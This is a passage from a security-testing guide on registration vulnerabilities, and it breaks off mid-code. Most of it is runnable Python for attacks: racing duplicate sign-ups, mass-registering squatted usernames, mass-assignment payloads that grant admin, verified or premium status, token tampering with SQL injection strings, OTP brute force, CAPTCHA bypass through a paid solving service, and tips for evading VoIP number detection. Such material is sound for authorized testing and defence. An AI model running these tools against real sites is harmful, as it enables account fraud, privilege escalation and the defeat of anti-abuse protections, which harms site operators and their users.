# Registration & Account Creation Vulnerabilities

## Overview

Registration endpoints are critical attack surfaces that can lead to account takeover, mass spam account creation, privilege escalation, and business logic abuse. This document covers comprehensive techniques for testing registration security.

---

## 1. Input Manipulation Attacks

### 1.1 Duplicate Account Creation

**Description**: Creating multiple accounts with the same or functionally equivalent identifiers.

**Testing Techniques**:

```python
#!/usr/bin/env python3
"""
Duplicate Account Creation Tester
Tests for race conditions and normalization issues in registration
"""

import asyncio
import aiohttp
import json
from typing import List, Dict

class DuplicateAccountTester:
    def __init__(self, target_url: str, headers: Dict = None):
        self.target_url = target_url
        self.headers = headers or {"Content-Type": "application/json"}
        self.results = []

    async def race_condition_test(self, email: str, password: str, num_requests: int = 20):
        """Test for race condition in registration endpoint"""
        async with aiohttp.ClientSession() as session:
            tasks = []
            for i in range(num_requests):
                payload = {
                    "email": email,
                    "password": password,
                    "username": f"testuser_{i}"
                }
                task = self.send_registration(session, payload)
                tasks.append(task)

            # Send all requests simultaneously
            responses = await asyncio.gather(*tasks, return_exceptions=True)

            successful = sum(1 for r in responses if isinstance(r, dict) and r.get('status') == 'success')
            print(f"[*] Race condition test: {successful}/{num_requests} successful registrations")
            return successful > 1

    async def send_registration(self, session: aiohttp.ClientSession, payload: Dict):
        try:
            async with session.post(self.target_url, json=payload, headers=self.headers) as resp:
                return {
                    'status': 'success' if resp.status in [200, 201] else 'failed',
                    'code': resp.status,
                    'body': await resp.text()
                }
        except Exception as e:
            return {'status': 'error', 'message': str(e)}

    def email_case_variations(self, base_email: str) -> List[str]:
        """Generate case variations of email"""
        local, domain = base_email.split('@')
        variations = [
            base_email,
            base_email.upper(),
            base_email.lower(),
            local.upper() + '@' + domain.lower(),
            local.lower() + '@' + domain.upper(),
            local.capitalize() + '@' + domain,
            ''.join(c.upper() if i % 2 else c.lower() for i, c in enumerate(local)) + '@' + domain
        ]
        return list(set(variations))

# Usage
async def main():
    tester = DuplicateAccountTester("https://target.com/api/register")

    # Test race condition
    is_vulnerable = await tester.race_condition_test(
        email="test@example.com",
        password="SecurePass123!"
    )

    if is_vulnerable:
        print("[!] VULNERABLE: Race condition allows duplicate accounts")

if __name__ == "__main__":
    asyncio.run(main())
```

**Payloads for Testing**:

```
# Same email, different requests timing
POST /register - email: user@test.com (Request 1)
POST /register - email: user@test.com (Request 2 - simultaneous)

# Whitespace manipulation
email: " user@test.com"
email: "user@test.com "
email: "user @test.com"
email: "user@ test.com"

# Unicode normalization issues
email: "user\u200b@test.com"  # Zero-width space
email: "u\u0073er@test.com"   # Normalized 's'
email: "\uff55ser@test.com"   # Fullwidth 'u'
```

---

### 1.2 Email Manipulation Techniques

**Description**: Exploiting email address parsing inconsistencies to create duplicate or attacker-controlled accounts.

#### Case Sensitivity Exploitation

```python
#!/usr/bin/env python3
"""
Email Case Manipulation Tester
Most email providers treat local part as case-insensitive
"""

def generate_email_case_variants(email: str) -> list:
    """Generate all case variations for testing"""
    local, domain = email.split('@')
    variants = []

    # Generate 2^n case combinations for local part
    for i in range(2 ** len(local)):
        variant = ''
        for j, char in enumerate(local):
            if (i >> j) & 1:
                variant += char.upper()
            else:
                variant += char.lower()
        variants.append(f"{variant}@{domain}")

    return list(set(variants))[:50]  # Limit to 50 variants

# Gmail-specific variations
def gmail_dot_variations(email: str) -> list:
    """Gmail ignores dots in local part - generate variants"""
    if '@gmail.com' not in email.lower():
        return [email]

    local, domain = email.split('@')
    variants = []

    # Remove all dots
    no_dots = local.replace('.', '')

    # Generate different dot placements
    for i in range(2 ** (len(no_dots) - 1)):
        variant = no_dots[0]
        for j in range(1, len(no_dots)):
            if (i >> (j - 1)) & 1:
                variant += '.'
            variant += no_dots[j]
        variants.append(f"{variant}@{domain}")

    return list(set(variants))[:100]

# Plus addressing exploitation
def plus_addressing_variants(email: str) -> list:
    """Generate plus addressing variants"""
    local, domain = email.split('@')
    base_local = local.split('+')[0]  # Remove existing plus tag

    variants = [
        f"{base_local}@{domain}",
        f"{base_local}+admin@{domain}",
        f"{base_local}+test@{domain}",
        f"{base_local}+1@{domain}",
        f"{base_local}+{domain.replace('.', '')}@{domain}",
        f"{base_local}+registration@{domain}",
        f"{base_local}+verify@{domain}",
    ]

    return variants
```

**Test Cases**:

```
# Gmail dot trick (all map to same mailbox)
test.user@gmail.com
testuser@gmail.com
t.e.s.t.u.s.e.r@gmail.com
te.st.us.er@gmail.com

# Plus addressing (all deliver to same mailbox)
user@gmail.com
user+anything@gmail.com
user+admin@gmail.com
user+victim@gmail.com

# Case manipulation
User@Gmail.com
USER@GMAIL.COM
uSeR@gMaIl.CoM

# Domain variations
user@googlemail.com (same as gmail.com)
user@outlook.com vs user@hotmail.com

# IDN homograph attack
user@gmаil.com (Cyrillic 'а')
user@gmaıl.com (Turkish dotless 'i')
```

---

### 1.3 Username Squatting

**Description**: Reserving usernames for impersonation, brand abuse, or selling.

```python
#!/usr/bin/env python3
"""
Username Squatting Detection and Testing
"""

import requests
from typing import List, Dict
import time

class UsernameSquatter:
    def __init__(self, base_url: str):
        self.base_url = base_url
        self.session = requests.Session()

    def generate_admin_variants(self, base: str = "admin") -> List[str]:
        """Generate privileged username variants"""
        prefixes = ['', 'super', 'sys', 'root', 'master', 'main', 'head']
        suffixes = ['', '1', '123', '_admin', '_root', 'istrator', '_sys']

        variants = []
        for prefix in prefixes:
            for suffix in suffixes:
                variants.append(f"{prefix}{base}{suffix}")

        # Add leet speak variants
        leet_map = {'a': ['4', '@'], 'e': ['3'], 'i': ['1', '!'], 'o': ['0'], 's': ['5', '$']}
        for char, replacements in leet_map.items():
            for replacement in replacements:
                variants.append(base.replace(char, replacement))

        return variants

    def generate_brand_typosquats(self, brand: str) -> List[str]:
        """Generate typosquat variants of brand names"""
        variants = [brand]

        # Character omission
        for i in range(len(brand)):
            variants.append(brand[:i] + brand[i+1:])

        # Character duplication
        for i in range(len(brand)):
            variants.append(brand[:i] + brand[i] + brand[i:])

        # Adjacent key substitution (QWERTY)
        adjacent = {
            'a': 'sqwz', 'b': 'vghn', 'c': 'xdfv', 'd': 'erfcxs',
            'e': 'wrsdf', 'f': 'rtgvcd', 'g': 'tyhbvf', 'h': 'yujnbg',
            'i': 'uojkl', 'j': 'uikmnh', 'k': 'ioljm', 'l': 'opk',
            'm': 'njk', 'n': 'bhjm', 'o': 'ipkl', 'p': 'ol',
            'q': 'wa', 'r': 'edft', 's': 'wedxza', 't': 'rfgy',
            'u': 'yhji', 'v': 'cfgb', 'w': 'qase', 'x': 'zsdc',
            'y': 'tghu', 'z': 'asx'
        }

        for i, char in enumerate(brand.lower()):
            if char in adjacent:
                for adj_char in adjacent[char]:
                    variants.append(brand[:i] + adj_char + brand[i+1:])

        return list(set(variants))

    def check_username_availability(self, username: str) -> Dict:
        """Check if username is available"""
        try:
            # Method 1: Registration endpoint
            resp = self.session.post(
                f"{self.base_url}/api/check-username",
                json={"username": username}
            )

            # Method 2: Profile URL check
            profile_resp = self.session.get(
                f"{self.base_url}/user/{username}",
                allow_redirects=False
            )

            return {
                "username": username,
                "available": resp.status_code == 200 and "available" in resp.text.lower(),
                "profile_exists": profile_resp.status_code == 200
            }
        except Exception as e:
            return {"username": username, "error": str(e)}

    def mass_register(self, usernames: List[str], email_template: str, password: str):
        """Attempt to register multiple usernames"""
        results = []
        for username in usernames:
            email = email_template.replace("{username}", username)
            try:
                resp = self.session.post(
                    f"{self.base_url}/api/register",
                    json={
                        "username": username,
                        "email": email,
                        "password": password
                    }
                )
                results.append({
                    "username": username,
                    "success": resp.status_code in [200, 201],
                    "response": resp.text[:200]
                })
                time.sleep(0.5)  # Rate limit respect
            except Exception as e:
                results.append({"username": username, "error": str(e)})

        return results

# Reserved username wordlist
RESERVED_USERNAMES = """
admin
administrator
root
superuser
sysadmin
webmaster
postmaster
hostmaster
support
help
info
contact
sales
marketing
security
abuse
noreply
no-reply
mailer-daemon
www
ftp
mail
smtp
imap
pop
api
cdn
static
assets
js
css
img
images
upload
uploads
download
downloads
backup
backups
config
system
test
demo
example
null
undefined
anonymous
guest
public
private
internal
dev
development
staging
production
beta
alpha
""".strip().split('\n')
```

---

### 1.4 Mass Assignment Vulnerabilities

**Description**: Exploiting endpoints that blindly accept and process all submitted parameters.

```python
#!/usr/bin/env python3
"""
Mass Assignment Vulnerability Tester
Tests for hidden parameter injection in registration
"""

import requests
import json
from typing import Dict, List

class MassAssignmentTester:
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.session = requests.Session()

    def get_hidden_params(self) -> List[Dict]:
        """Common hidden parameters to test"""
        return [
            # Role/Permission escalation
            {"role": "admin"},
            {"role": "administrator"},
            {"role": "superuser"},
            {"role_id": 1},
            {"role_id": 0},
            {"is_admin": True},
            {"is_admin": 1},
            {"isAdmin": True},
            {"admin": True},
            {"admin": 1},
            {"user_type": "admin"},
            {"userType": "admin"},
            {"type": "admin"},
            {"privilege": "admin"},
            {"privileges": ["admin", "user"]},
            {"permissions": ["*"]},
            {"group": "administrators"},
            {"groups": ["admin", "users"]},
            {"level": 0},
            {"access_level": 999},

            # Account status manipulation
            {"verified": True},
            {"email_verified": True},
            {"emailVerified": True},
            {"is_verified": True},
            {"isVerified": True},
            {"confirmed": True},
            {"active": True},
            {"is_active": True},
            {"isActive": True},
            {"status": "active"},
            {"status": "verified"},
            {"approved": True},
            {"is_approved": True},

            # Premium/Subscription
            {"premium": True},
            {"is_premium": True},
            {"isPremium": True},
            {"subscription": "premium"},
            {"subscription_type": "enterprise"},
            {"plan": "enterprise"},
            {"tier": "premium"},
            {"paid": True},
            {"credits": 999999},
            {"balance": 999999},

            # Internal fields
            {"id": 1},
            {"user_id": 1},
            {"userId": 1},
            {"created_by": 1},
            {"createdBy": 1},
            {"organization_id": 1},
            {"organizationId": 1},
            {"tenant_id": 1},
            {"tenantId": 1},
            {"company_id": 1},

            # Token manipulation
            {"api_key": "admin_key"},
            {"apiKey": "admin_key"},
            {"token": "admin_token"},
            {"auth_token": "admin_token"},

            # Metadata
            {"__proto__": {"admin": True}},  # Prototype pollution
            {"constructor": {"prototype": {"admin": True}}},
        ]

    def test_mass_assignment(self, base_payload: Dict) -> List[Dict]:
        """Test each hidden parameter"""
        results = []

        for hidden_param in self.get_hidden_params():
            test_payload = {**base_payload, **hidden_param}

            try:
                resp = self.session.post(
                    self.target_url,
                    json=test_payload,
                    headers={"Content-Type": "application/json"}
                )

                results.append({
                    "payload": hidden_param,
                    "status_code": resp.status_code,
                    "response": resp.text[:500],
                    "potential_success": self._analyze_response(resp, hidden_param)
                })

            except Exception as e:
                results.append({
                    "payload": hidden_param,
                    "error": str(e)
                })

        return results

    def _analyze_response(self, response, param: Dict) -> bool:
        """Analyze if the parameter might have been accepted"""
        # Check if parameter key appears in response
        for key in param.keys():
            if key in response.text:
                return True

        # Check for successful status codes
        if response.status_code in [200, 201]:
            return True

        return False

    def test_json_variations(self, base_payload: Dict):
        """Test different JSON structures for mass assignment"""
        variations = [
            # Nested objects
            {"user": {**base_payload, "role": "admin"}},
            {"data": {**base_payload, "is_admin": True}},
            {"attributes": {**base_payload, "verified": True}},

            # Array injection
            {**base_payload, "roles": ["admin", "user"]},
            {**base_payload, "permissions": ["read", "write", "admin"]},

            # Dot notation (some frameworks expand this)
            {**base_payload, "user.role": "admin"},
            {**base_payload, "user.is_admin": True},

            # Bracket notation
            {**base_payload, "user[role]": "admin"},
            {**base_payload, "user[is_admin]": True},
        ]

        return variations

# Example usage
def test_registration_mass_assignment(target_url: str):
    tester = MassAssignmentTester(target_url)

    base_payload = {
        "email": "test@example.com",
        "password": "SecurePass123!",
        "username": "testuser"
    }

    results = tester.test_mass_assignment(base_payload)

    # Filter potentially successful attacks
    potential_vulns = [r for r in results if r.get('potential_success')]

    for vuln in potential_vulns:
        print(f"[!] Potential vulnerability: {vuln['payload']}")
        print(f"    Response: {vuln['response'][:200]}")
```

---

### 1.5 Hidden Parameter Injection

**Description**: Discovering and exploiting undocumented parameters in registration requests.

```python
#!/usr/bin/env python3
"""
Hidden Parameter Discovery Tool
Uses various techniques to find hidden parameters
"""

import requests
import json
from typing import List, Dict, Set
import re

class HiddenParamDiscovery:
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.session = requests.Session()
        self.discovered_params = set()

    def extract_from_js(self, js_urls: List[str]) -> Set[str]:
        """Extract parameter names from JavaScript files"""
        params = set()

        patterns = [
            r'["\']([\w_]+)["\']:\s*["\']',  # JSON keys
            r'\.(\w+)\s*=',  # Object property assignment
            r'params\.(\w+)',  # params.something
            r'data\.(\w+)',  # data.something
            r'body\.(\w+)',  # body.something
            r'req\.body\.(\w+)',  # Express.js pattern
            r'request\.(\w+)',  # Request object
            r'formData\.append\(["\'](\w+)',  # FormData
            r'name=["\'](\w+)["\']',  # HTML name attributes
        ]

        for url in js_urls:
            try:
                resp = self.session.get(url)
                content = resp.text

                for pattern in patterns:
                    matches = re.findall(pattern, content)
                    params.update(matches)
            except Exception:
                continue

        return params

    def extract_from_api_docs(self, docs_url: str) -> Set[str]:
        """Extract parameters from API documentation"""
        params = set()

        try:
            resp = self.session.get(docs_url)
            content = resp.text

            # OpenAPI/Swagger patterns
            openapi_patterns = [
                r'"name":\s*"(\w+)"',
                r'name:\s*(\w+)',
                r'parameters:.*?name:\s*(\w+)',
            ]

            for pattern in openapi_patterns:
                matches = re.findall(pattern, content, re.DOTALL)
                params.update(matches)

        except Exception:
            pass

        return params

    def common_registration_params(self) -> List[str]:
        """Common registration parameter names"""
        return [
            # Basic fields
            "email", "mail", "e-mail", "user_email", "userEmail",
            "username", "user_name", "userName", "login", "user", "name",
            "password", "pass", "pwd", "passwd", "user_password", "userPassword",
            "password_confirmation", "passwordConfirmation", "confirm_password",
            "confirmPassword", "password2", "pass2",

            # Personal info
            "first_name", "firstName", "fname", "given_name", "givenName",
            "last_name", "lastName", "lname", "family_name", "familyName",
            "full_name", "fullName", "display_name", "displayName",
            "phone", "phone_number", "phoneNumber", "mobile", "tel", "telephone",
            "address", "street", "city", "state", "zip", "zipcode", "postal_code",
            "country", "country_code", "countryCode",
            "dob", "date_of_birth", "dateOfBirth", "birthday", "birth_date",
            "age", "gender", "sex",

            # Account settings
            "role", "roles", "role_id", "roleId", "user_type", "userType", "type",
            "is_admin", "isAdmin", "admin", "is_superuser", "isSuperuser",
            "permissions", "privilege", "privileges", "access", "access_level",
            "group", "groups", "group_id", "groupId",
            "organization", "org", "organization_id", "organizationId", "org_id",
            "company", "company_id", "companyId", "tenant", "tenant_id", "tenantId",

            # Status fields
            "active", "is_active", "isActive", "enabled", "is_enabled", "isEnabled",
            "verified", "is_verified", "isVerified", "email_verified", "emailVerified",
            "confirmed", "is_confirmed", "isConfirmed", "approved", "is_approved",
            "status", "account_status", "accountStatus",

            # Subscription/Premium
            "premium", "is_premium", "isPremium", "paid", "is_paid", "isPaid",
            "plan", "subscription", "subscription_type", "subscriptionType",
            "tier", "level", "credits", "balance", "quota",

            # Meta fields
            "id", "user_id", "userId", "uuid", "guid",
            "created_at", "createdAt", "created", "timestamp",
            "updated_at", "updatedAt", "modified", "modified_at",
            "created_by", "createdBy", "owner", "owner_id", "ownerId",

            # Security fields
            "token", "auth_token", "authToken", "api_key", "apiKey",
            "secret", "secret_key", "secretKey", "otp", "totp_secret",
            "security_question", "securityQuestion", "security_answer",

            # Marketing/Analytics
            "referral", "referral_code", "referralCode", "ref", "referred_by",
            "invite_code", "inviteCode", "invitation", "promo", "promo_code",
            "source", "utm_source", "campaign", "medium",

            # Misc
            "avatar", "avatar_url", "avatarUrl", "profile_picture", "profilePicture",
            "bio", "biography", "description", "about", "website", "url",
            "timezone", "locale", "language", "lang", "currency",
            "newsletter", "marketing", "notifications", "preferences",
            "terms", "terms_accepted", "termsAccepted", "tos", "privacy",
            "captcha", "recaptcha", "g-recaptcha-response", "h-captcha-response",
        ]

    def fuzz_params(self, base_payload: Dict, params_to_test: List[str]) -> List[Dict]:
        """Fuzz registration with discovered parameters"""
        results = []

        test_values = [True, 1, "admin", "true", "1", "yes", "enabled"]

        for param in params_to_test:
            for value in test_values:
                test_payload = {**base_payload, param: value}

                try:
                    resp = self.session.post(
                        self.target_url,
                        json=test_payload,
                        headers={"Content-Type": "application/json"}
                    )

                    # Look for signs the parameter was processed
                    if param in resp.text or resp.status_code != 400:
                        results.append({
                            "param": param,
                            "value": value,
                            "status": resp.status_code,
                            "response_snippet": resp.text[:200]
                        })
                        break  # Found a working value, move to next param

                except Exception as e:
                    continue

        return results
```

---

## 2. Verification Bypass Techniques

### 2.1 Email Verification Bypass

```python
#!/usr/bin/env python3
"""
Email Verification Bypass Techniques
"""

import requests
import re
import hashlib
import time
from typing import Dict, List, Optional
from urllib.parse import urljoin, parse_qs, urlparse

class EmailVerificationBypass:
    def __init__(self, base_url: str):
        self.base_url = base_url
        self.session = requests.Session()

    def test_direct_access(self, endpoints: List[str] = None) -> List[Dict]:
        """Test if protected endpoints are accessible without verification"""
        if endpoints is None:
            endpoints = [
                "/dashboard",
                "/profile",
                "/settings",
                "/api/user",
                "/api/profile",
                "/api/data",
                "/api/v1/user",
                "/account",
                "/home",
            ]

        results = []
        for endpoint in endpoints:
            url = urljoin(self.base_url, endpoint)
            try:
                resp = self.session.get(url)
                if resp.status_code == 200:
                    results.append({
                        "endpoint": endpoint,
                        "accessible": True,
                        "status": resp.status_code
                    })
            except Exception:
                continue

        return results

    def test_token_manipulation(self, verification_url: str) -> List[Dict]:
        """Test various token manipulation techniques"""
        parsed = urlparse(verification_url)
        params = parse_qs(parsed.query)
        token = params.get('token', [''])[0]

        results = []
        manipulations = [
            # Empty/null tokens
            {"token": ""},
            {"token": "null"},
            {"token": "undefined"},
            {"token": "0"},
            {"token": "true"},
            {"token": "1"},

            # Common weak tokens
            {"token": "test"},
            {"token": "verify"},
            {"token": "admin"},
            {"token": hashlib.md5(b"").hexdigest()},
            {"token": hashlib.md5(b"test").hexdigest()},
            {"token": hashlib.sha1(b"").hexdigest()},
            {"token": hashlib.sha256(b"").hexdigest()},

            # Truncated/modified original
            {"token": token[:8] if token else ""},
            {"token": token[:16] if token else ""},
            {"token": token[:-4] + "0000" if len(token) > 4 else ""},

            # SQL injection in token
            {"token": "' OR '1'='1"},
            {"token": "' OR 1=1--"},
            {"token": "1' OR '1'='1"},

            # Array/object injection
            {"token[]": ""},
            {"token[]": token},
            {"token[0]": token},
        ]

        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        for manipulation in manipulations:
            try:
                resp = self.session.get(base_url, params=manipulation)
                if "verified" in resp.text.lower() or resp.status_code == 200:
                    results.append({
                        "manipulation": manipulation,
                        "success": True,
                        "status": resp.status_code,
                        "response": resp.text[:200]
                    })
            except Exception:
                continue

        return results

    def test_response_manipulation(self) -> Dict:
        """
        Test if client-side verification status can be manipulated
        Returns instructions for manual testing
        """
        return {
            "technique": "Response Manipulation",
            "steps": [
                "1. Intercept the verification check response",
                "2. Modify 'verified: false' to 'verified: true'",
                "3. Modify 'email_verified: false' to 'email_verified: true'",
                "4. Modify 'status: unverified' to 'status: verified'",
                "5. Check if the UI updates and grants access"
            ],
            "common_response_fields": [
                "verified", "is_verified", "isVerified",
                "email_verified", "emailVerified", "email_confirmed",
                "confirmed", "is_confirmed", "isConfirmed",
                "status", "account_status", "verification_status"
            ]
        }

    def test_resend_abuse(self, email: str, count: int = 10) -> Dict:
        """Test resend verification for rate limiting and token reuse"""
        tokens = []

        for i in range(count):
            try:
                resp = self.session.post(
                    urljoin(self.base_url, "/api/resend-verification"),
                    json={"email": email}
                )

                # Try to extract token from response if leaked
                token_match = re.search(r'token["\']?\s*[:=]\s*["\']?([a-zA-Z0-9_-]+)', resp.text)
                if token_match:
                    tokens.append(token_match.group(1))

                time.sleep(0.5)
            except Exception:
                continue

        return {
            "requests_sent": count,
            "tokens_leaked": len(tokens),
            "unique_tokens": len(set(tokens)),
            "tokens": tokens[:5]  # First 5 for analysis
        }

    def test_oauth_bypass(self) -> Dict:
        """Test if OAuth signup bypasses email verification"""
        oauth_endpoints = [
            "/auth/google",
            "/auth/facebook",
            "/auth/github",
            "/auth/twitter",
            "/oauth/google",
            "/oauth/facebook",
            "/api/auth/google",
            "/api/oauth/google/callback",
        ]

        results = []
        for endpoint in oauth_endpoints:
            try:
                resp = self.session.get(urljoin(self.base_url, endpoint), allow_redirects=False)
                if resp.status_code in [200, 302, 303]:
                    results.append({
                        "endpoint": endpoint,
                        "available": True,
                        "status": resp.status_code
                    })
            except Exception:
                continue

        return {
            "oauth_endpoints": results,
            "test_steps": [
                "1. Register account with email requiring verification",
                "2. Link OAuth provider to the same email",
                "3. Login via OAuth",
                "4. Check if email verification is bypassed"
            ]
        }

# Verification token prediction
class TokenPrediction:
    """Predict weak verification tokens"""

    @staticmethod
    def sequential_tokens(base: int, count: int = 100) -> List[str]:
        """Generate sequential tokens if incremental pattern detected"""
        return [str(base + i) for i in range(-50, count)]

    @staticmethod
    def timestamp_tokens(timestamp: int = None) -> List[str]:
        """Generate timestamp-based tokens"""
        ts = timestamp or int(time.time())
        tokens = []

        for offset in range(-300, 300):  # +/- 5 minutes
            t = ts + offset
            tokens.extend([
                str(t),
                hashlib.md5(str(t).encode()).hexdigest(),
                hashlib.sha1(str(t).encode()).hexdigest(),
                hashlib.sha256(str(t).encode()).hexdigest()[:32],
            ])

        return tokens

    @staticmethod
    def email_based_tokens(email: str) -> List[str]:
        """Generate tokens based on email"""
        return [
            hashlib.md5(email.encode()).hexdigest(),
            hashlib.sha1(email.encode()).hexdigest(),
            hashlib.sha256(email.encode()).hexdigest()[:32],
            hashlib.md5((email + "verify").encode()).hexdigest(),
            hashlib.md5((email + "secret").encode()).hexdigest(),
        ]
```

---

### 2.2 Phone Verification Bypass

```python
#!/usr/bin/env python3
"""
Phone/SMS Verification Bypass Techniques
"""

import requests
import time
from typing import Dict, List
from itertools import product

class PhoneVerificationBypass:
    def __init__(self, base_url: str):
        self.base_url = base_url
        self.session = requests.Session()

    def brute_force_otp(self, phone: str, digits: int = 4) -> Dict:
        """Brute force OTP codes"""
        # Generate all possible codes
        codes = [str(i).zfill(digits) for i in range(10 ** digits)]

        results = {
            "attempted": 0,
            "rate_limited_at": None,
            "success": None
        }

        for code in codes:
            try:
                resp = self.session.post(
                    f"{self.base_url}/api/verify-phone",
                    json={"phone": phone, "code": code}
                )

                results["attempted"] += 1

                if resp.status_code == 429:
                    results["rate_limited_at"] = results["attempted"]
                    break

                if "success" in resp.text.lower() or "verified" in resp.text.lower():
                    results["success"] = code
                    break

            except Exception as e:
                continue

        return results

    def test_common_codes(self, phone: str) -> List[Dict]:
        """Test commonly used/default OTP codes"""
        common_codes = [
            "0000", "1111", "1234", "4321", "9999",
            "0123", "6789", "1357", "2468", "0101",
            "000000", "111111", "123456", "654321",
            "999999", "012345", "0000", "123123",
            # Common test codes
            "test", "1234567890", "code", "verify"
        ]

        results = []
        for code in common_codes:
            try:
                resp = self.session.post(
                    f"{self.base_url}/api/verify-phone",
                    json={"phone": phone, "code": code}
                )

                if resp.status_code == 200:
                    results.append({
                        "code": code,
                        "status": resp.status_code,
                        "response": resp.text[:200]
                    })
            except Exception:
                continue

        return results

    def test_code_reuse(self, phone: str, valid_code: str) -> Dict:
        """Test if OTP codes can be reused"""
        results = []

        for i in range(5):
            try:
                resp = self.session.post(
                    f"{self.base_url}/api/verify-phone",
                    json={"phone": phone, "code": valid_code}
                )
                results.append({
                    "attempt": i + 1,
                    "status": resp.status_code,
                    "response": resp.text[:100]
                })
                time.sleep(0.5)
            except Exception:
                continue

        return {
            "code_tested": valid_code,
            "attempts": results,
            "reusable": any(r["status"] == 200 for r in results[1:])
        }

    def test_code_leak(self, phone: str) -> Dict:
        """Test if OTP is leaked in response"""
        try:
            resp = self.session.post(
                f"{self.base_url}/api/send-otp",
                json={"phone": phone}
            )

            # Check headers
            headers_to_check = ['X-OTP', 'X-Code', 'X-Verification-Code', 'Debug-Code']
            leaked_in_headers = {h: resp.headers.get(h) for h in headers_to_check if resp.headers.get(h)}

            # Check response body
            import re
            code_patterns = [
                r'"code"\s*:\s*"?(\d{4,6})"?',
                r'"otp"\s*:\s*"?(\d{4,6})"?',
                r'"verification_code"\s*:\s*"?(\d{4,6})"?',
                r'"verificationCode"\s*:\s*"?(\d{4,6})"?',
            ]

            leaked_in_body = []
            for pattern in code_patterns:
                matches = re.findall(pattern, resp.text)
                leaked_in_body.extend(matches)

            return {
                "leaked_in_headers": leaked_in_headers,
                "leaked_in_body": leaked_in_body,
                "response": resp.text[:500]
            }

        except Exception as e:
            return {"error": str(e)}

    def test_voip_numbers(self) -> Dict:
        """Information about testing with VoIP numbers"""
        return {
            "services": [
                {"name": "TextNow", "url": "https://www.textnow.com/"},
                {"name": "Google Voice", "url": "https://voice.google.com/"},
                {"name": "TextFree", "url": "https://www.textfree.us/"},
                {"name": "Hushed", "url": "https://hushed.com/"},
                {"name": "Burner", "url": "https://www.burnerapp.com/"},
            ],
            "detection_bypass": [
                "Use newer VoIP services with clean number pools",
                "Try numbers from different area codes",
                "Some services check carrier type - try different providers",
                "Test international numbers if supported"
            ]
        }
```

---

### 2.3 CAPTCHA Bypass Techniques

```python
#!/usr/bin/env python3
"""
CAPTCHA Bypass Techniques for Security Testing
"""

import requests
import time
import base64
from typing import Dict, List, Optional
import re

class CAPTCHABypass:
    def __init__(self, base_url: str):
        self.base_url = base_url
        self.session = requests.Session()

    def test_captcha_absence(self, endpoint: str, payload: Dict) -> Dict:
        """Test if CAPTCHA is actually required"""
        # Test without CAPTCHA parameter
        try:
            resp = self.session.post(endpoint, json=payload)
            return {
                "technique": "CAPTCHA Absence",
                "success": resp.status_code in [200, 201],
                "status": resp.status_code,
                "response": resp.text[:200]
            }
        except Exception as e:
            return {"error": str(e)}

    def test_empty_captcha(self, endpoint: str, payload: Dict) -> List[Dict]:
        """Test various empty/null CAPTCHA values"""
        captcha_fields = [
            "captcha", "captcha_response", "captchaResponse",
            "g-recaptcha-response", "h-captcha-response",
            "recaptcha", "hcaptcha", "turnstile"
        ]

        empty_values = ["", None, "null", "undefined", "0", "[]", "{}", "true", "false"]

        results = []
        for field in captcha_fields:
            for value in empty_values:
                test_payload = {**payload, field: value}
                try:
                    resp = self.session.post(endpoint, json=test_payload)
                    if resp.status_code in [200, 201]:
                        results.append({
                            "field": field,
                            "value": value,
                            "success": True,
                            "status": resp.status_code
                        })
                except Exception:
                    continue

        return results

    def test_captcha_reuse(self, endpoint: str, payload: Dict, valid_captcha: str) -> Dict:
        """Test if CAPTCHA token can be reused"""
        results = []

        for i in range(5):
            test_payload = {**payload, "g-recaptcha-response": valid_captcha}
            try:
                resp = self.session.post(endpoint, json=test_payload)
                results.append({
                    "attempt": i + 1,
                    "status": resp.status_code,
                    "success": resp.status_code in [200, 201]
                })
                time.sleep(1)
            except Exception as e:
                results.append({"attempt": i + 1, "error": str(e)})

        return {
            "valid_captcha": valid_captcha[:50] + "...",
            "reuse_attempts": results,
            "reusable": sum(1 for r in results if r.get("success", False)) > 1
        }

    def test_captcha_removal(self, endpoint: str, payload: Dict) -> Dict:
        """Test removing CAPTCHA from request entirely"""
        # Remove any CAPTCHA-related keys
        clean_payload = {k: v for k, v in payload.items()
                        if not any(cap in k.lower() for cap in ['captcha', 'recaptcha', 'hcaptcha'])}

        try:
            resp = self.session.post(endpoint, json=clean_payload)
            return {
                "technique": "CAPTCHA Removal",
                "success": resp.status_code in [200, 201],
                "status": resp.status_code,
                "response": resp.text[:200]
            }
        except Exception as e:
            return {"error": str(e)}

    def test_header_manipulation(self, endpoint: str, payload: Dict) -> List[Dict]:
        """Test if CAPTCHA validation is based on headers"""
        header_tests = [
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Real-IP": "127.0.0.1"},
            {"X-CAPTCHA-Bypass": "true"},
            {"X-Requested-With": "XMLHttpRequest"},
            {"X-Internal-Request": "true"},
            {"X-Admin-Request": "true"},
            {"Origin": "null"},
            {"Referer": ""},
        ]

        results = []
        for headers in header_tests:
            try:
                resp = self.session.post(
                    endpoint,
                    json=payload,
                    headers=headers
                )
                if resp.status_code in [200, 201]:
                    results.append({
                        "headers": headers,
                        "success": True,
                        "status": resp.status_code
                    })
            except Exception:
                continue

        return results

    def get_solving_services(self) -> Dict:
        """Information about CAPTCHA solving services (for authorized testing)"""
        return {
            "services": [
                {
                    "name": "2Captcha",
                    "url": "https://2captcha.com/",
                    "supports": ["reCAPTCHA v2/v3", "hCaptcha", "FunCaptcha", "Image CAPTCHA"],
                    "api_example": """
import requests

API_KEY = "your_api_key"

# Submit CAPTCHA
resp = requests.post("http://2captcha.com/in.php", data={
    "key": API_KEY,
    "method": "userrecaptcha",
    "googlekey": "SITE_KEY",
    "pageurl": "TARGET_URL"
})
captcha_id = resp.text.split("|")[1]

# Get result
import time
time.sleep(20)
resp = requests.get(f"http://2captcha.com/res.php?key={API_KEY}&action=get&id={captcha_id}")
captcha_token = resp.text.split("|")[1]
"""
                },
                {
                    "name": "Anti-Captcha",
                    "url": "https://anti-captcha.com/",
                    "supports": ["reCAPTCHA", "hCaptcha", "FunCaptcha", "GeeTest"]
                },
                {
                    "name": "CapMonster",
                    "url": "https://capmonster.cloud/",
                    "supports": ["reCAPTCHA", "hCaptcha", "Image CAPTCHA"]
                }
            ],
            "note": "Only use for authorized security testing"
        }

    def test_invisible_captcha_bypass(self, endpoint: str, payload: Dict) -> Dict:
        """Test bypasses for invisible reCAPTCHA"""
        techniques = []

        # Test 1: Direct submission without triggering CAPTCHA
        try:
            resp = self.session.post(
                endpoint,
                json=payload,
                headers={"X-Requested-With": "XMLHttpRequest"}
            )
            techniques.append({
                "name": "Direct AJAX submission",
                "success": resp.status_code in [200, 201],
